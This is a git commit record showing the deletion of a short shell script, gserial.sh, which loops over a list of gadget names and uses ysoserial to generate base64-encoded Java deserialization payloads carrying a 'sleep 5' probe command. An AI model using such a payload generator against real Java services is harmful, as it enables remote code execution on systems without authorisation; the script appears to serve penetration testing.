33b77cdd970b32b80709def8b37b9827f39568aa
Rodolfo Mariano <rodolfomarianocy@gmail.com>
2022-06-03 18:11:28 -0300

    Delete gserial.sh

--- gserial.sh
+++
@@ -1,4 +0,0 @@
-while read payload; 
-do echo "$payload\n\n"; 
-java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser; 
-echo "-----------------Loading-----------------\n\n"; done < payloads.txt
